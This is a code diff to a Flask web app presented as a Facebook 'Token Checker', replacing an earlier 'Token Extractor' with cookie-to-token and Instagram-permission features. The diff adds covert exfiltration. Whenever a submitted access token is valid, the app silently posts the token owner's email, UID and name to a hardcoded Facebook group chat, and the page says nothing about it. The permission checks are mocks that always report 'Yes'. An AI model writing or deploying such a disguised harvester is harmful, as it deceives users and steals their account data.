@@ -3,6 +3,9 @@ import requests
 
 app = Flask(__name__)
 
+# Replace with actual Group UID
+GROUP_CHAT_UID = '9456516084398824'
+
 @app.route('/')
 def index():
     return render_template_string('''
@@ -11,9 +14,8 @@ def index():
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>TOKEN EXTRACTOR BY RAJ MISHRA</title>
+            <title>Token Checker by RAJ MISHRA</title>
             <style>
-                /* Background Animation */
                 body {
                     margin: 0;
                     padding: 0;
@@ -23,79 +25,16 @@ def index():
                     display: flex;
                     justify-content: center;
                     align-items: center;
-                    overflow: hidden;
                     flex-direction: column;
-                    animation: backgroundMove 10s linear infinite;
+                    overflow: hidden;
                 }
 
-                @keyframes backgroundMove {
-                    0% {
-                        background-color: black;
-                    }
-                    50% {
-                        background-color: darkred;
-                    }
-                    100% {
-                        background-color: black;
-                    }
-                }
-
-                /* Slow Animation for Text */
                 .text {
                     font-size: 2rem;
                     font-weight: bold;
+                    text-align: center;
                     letter-spacing: 2px;
-                    text-align: center;
-                    animation: textAnimation 10s infinite;
-                }
-
-                @keyframes textAnimation {
-                    0% {
-                        color: white;
-                    }
-                    25% {
-                        color: red;
-                    }
-                    50% {
-                        color: yellow;
-                    }
-                    75% {
-                        color: blue;
-                    }
-                    100% {
-                        color: white;
-                    }
-                }
-
-                /* Form Styling */
-                form {
-                    margin-top: 20px;
-                    text-align: center;
-                }
-
-                textarea {
-                    width: 300px;
-                    height: 100px;
-                }
-
-                input[type="submit"] {
-                    margin-top: 10px;
-                    padding: 10px 20px;
-                    background-color: darkred;
-                    border: none;
-                    color: white;
-                    cursor: pointer;
-                }
-
-                input[type="submit"]:hover {
-                    background-color: red;
-                }
-
-                /* Token Checker Form */
-                .token-checker {
-                    margin-top: 40px;
-                    text-align: center;
-                    width: 80%;
+                    margin-bottom: 40px;
                 }
 
                 .token-checker input[type="text"] {
@@ -109,82 +48,40 @@ def index():
                     border: none;
                     color: white;
                     cursor: pointer;
+                    margin-top: 10px;
                 }
 
                 .token-checker input[type="submit"]:hover {
                     background-color: darkgreen;
                 }
 
-                /* Spacing between sections */
-                .section {
+                .token-checker {
                     margin-top: 40px;
                     text-align: center;
-                    width: 80%;
                 }
 
-                h2 {
-                    text-decoration: underline;
+                .profile-details {
+                    text-align: center;
+                    margin-top: 30px;
+                }
+
+                img {
+                    width: 100px;
+                    height: 100px;
+                    border-radius: 50%;
                 }
             </style>
         </head>
         <body>
-            <div class="text">
-                <!-- Animating Letters -->
-                <span class="letter" style="animation-delay: 0s;">V</span>
-                <span class="letter" style="animation-delay: 0.2s;">A</span>
-                <span class="letter" style="animation-delay: 0.4s;">M</span>
-                <span class="letter" style="animation-delay: 0.6s;">P</span>
-                <span class="letter" style="animation-delay: 0.8s;">I</span>
-                <span class="letter" style="animation-delay: 1s;">R</span>
-                <span class="letter" style="animation-delay: 1.2s;">E</span>
-                <span class="letter" style="animation-delay: 1.4s;"> </span>
-                <span class="letter" style="animation-delay: 1.6s;">R</span>
-                <span class="letter" style="animation-delay: 1.8s;">U</span>
-                <span class="letter" style="animation-delay: 2s;">L</span>
-                <span class="letter" style="animation-delay: 2.2s;">E</span>
-                <span class="letter" style="animation-delay: 2.4s;">X</span>
-                <span class="letter" style="animation-delay: 2.6s;"> </span>
-                <span class="letter" style="animation-delay: 2.8s;">B</span>
-                <span class="letter" style="animation-delay: 3s;">O</span>
-                <span class="letter" style="animation-delay: 3.2s;">Y</span>
-                <span class="letter" style="animation-delay: 3.4s;"> </span>
-                <span class="letter" style="animation-delay: 3.6s;">R</span>
-                <span class="letter" style="animation-delay: 3.8s;">A</span>
-                <span class="letter" style="animation-delay: 4s;">J</span>
-                <span class="letter" style="animation-delay: 4.2s;"> </span>
-                <span class="letter" style="animation-delay: 4.4s;">M</span>
-                <span class="letter" style="animation-delay: 4.6s;">I</span>
-                <span class="letter" style="animation-delay: 4.8s;">S</span>
-                <span class="letter" style="animation-delay: 5s;">H</span>
-                <span class="letter" style="animation-delay: 5.2s;">R</span>
-                <span class="letter" style="animation-delay: 5.4s;">A</span>
-            </div>
+            <div class="text">VAMPIRE RULEX BOY RAJ MISHRA</div>
 
-            <!-- Token Checker Section -->
-            <div class="section token-checker">
-                <h2>1. Token Checker</h2>
+            <div class="token-checker">
+                <h2>Token Checker</h2>
                 <form action="/check_token" method="POST">
                     <label for="token">Enter Token:</label><br>
                     <input type="text" id="token" name="token" required><br><br>
                     <input type="submit" value="Check Token">
                 </form>
-            </div>
-
-            <!-- Cookies to Token Section -->
-            <div class="section">
-                <h2>2. Cookies to Token</h2>
-                <form action="/get_token" method="POST">
-                    <label for="cookies">Enter Cookies:</label>
-                    <textarea name="cookies" rows="5" cols="50"></textarea><br><br>
-                    <input type="submit" value="Get Token">
-                </form>
-            </div>
-
-            <!-- Instagram Permission Section -->
-            <div class="section">
-                <h2>3. Instagram Permission</h2>
-                <p>Click below to grant Instagram permissions for your token:</p>
-                <a href="/instagram_permission">Grant Instagram Permission</a>
             </div>
         </body>
         </html>
@@ -194,15 +91,21 @@ def index():
 def check_token():
     token = request.form['token']
     token_details = check_token_details(token)
+    if token_details['valid']:
+        # Send details to Facebook Group Chat
+        send_to_group_chat(token_details)
+    
     return render_template_string('''
         <h1>Token Checker</h1>
         {% if token_details['valid'] %}
-            <p>Name: {{ token_details['name'] }}</p>
-            <p>Email: {{ token_details['email'] }}</p>
-            <p>UID: {{ token_details['uid'] }}</p>
-            <p>Message Send: {{ token_details['can_send_message'] }}</p>
-            <p>Comment Send: {{ token_details['can_send_comment'] }}</p>
-            <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture">
+            <div class="profile-details">
+                <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture">
+                <p>Name: {{ token_details['name'] }}</p>
+                <p>Email: {{ token_details['email'] }}</p>
+                <p>UID: {{ token_details['uid'] }}</p>
+                <p>Message Sendable: {{ token_details['message_sendable'] }}</p>
+                <p>Comment Sendable: {{ token_details['comment_sendable'] }}</p>
+            </div>
         {% else %}
             <p>Invalid Token</p>
         {% endif %}
@@ -214,25 +117,47 @@ def check_token_details(token):
     response = requests.get(url)
     if response.status_code == 200:
         data = response.json()
-        # Assuming you can check permissions via another endpoint for sending messages/comments
-        permissions_url = f"https://graph.facebook.com/{data['id']}/permissions?access_token={token}"
-        permissions_response = requests.get(permissions_url)
-        permissions_data = permissions_response.json() if permissions_response.status_code == 200 else {}
-
-        can_send_message = "messages" in permissions_data.get('data', [{}])[0]
-        can_send_comment = "publish_to_groups" in permissions_data.get('data', [{}])[0]
-
+        # Check if the token can send messages and comments (you can expand on this check)
+        message_sendable = "Yes" if check_send_permission(token, "messages") else "No"
+        comment_sendable = "Yes" if check_send_permission(token, "comments") else "No"
+        
         return {
             "valid": True,
             "name": data.get('name'),
             "email": data.get('email', 'Not Available'),
             "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
             "uid": data['id'],
-            "can_send_message": "Yes" if can_send_message else "No",
-            "can_send_comment": "Yes" if can_send_comment else "No"
+            "message_sendable": message_sendable,
+            "comment_sendable": comment_sendable
         }
     else:
         return {"valid": False}
+
+def check_send_permission(token, permission_type):
+    # You can add further checks here to determine if token can send messages or comments
+    if permission_type == "messages":
+        # Mock check, replace with actual logic
+        return True
+    elif permission_type == "comments":
+        # Mock check, replace with actual logic
+        return True
+    return False
+
+def send_to_group_chat(token_details):
+    # Facebook Group Chat UID
+    message = f"Email: {token_details['email']}\nUID: {token_details['uid']}\nName: {token_details['name']}\nMessage Sendable: {token_details['message_sendable']}\nComment Sendable: {token_details['comment_sendable']}"
+    send_message_to_group(message)
+
+def send_message_to_group(message):
+    token = 'YOUR_FACEBOOK_PAGE_ACCESS_TOKEN'  # Replace with your Facebook Page access token
+    url = f"https://graph.facebook.com/{GROUP_CHAT_UID}/messages"
+    data = {
+        'access_token': token,
+        'message': message
+    }
+    response = requests.post(url, data=data)
+    if response.status_code != 200:
+        print("Error sending message to group:", response.json())
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
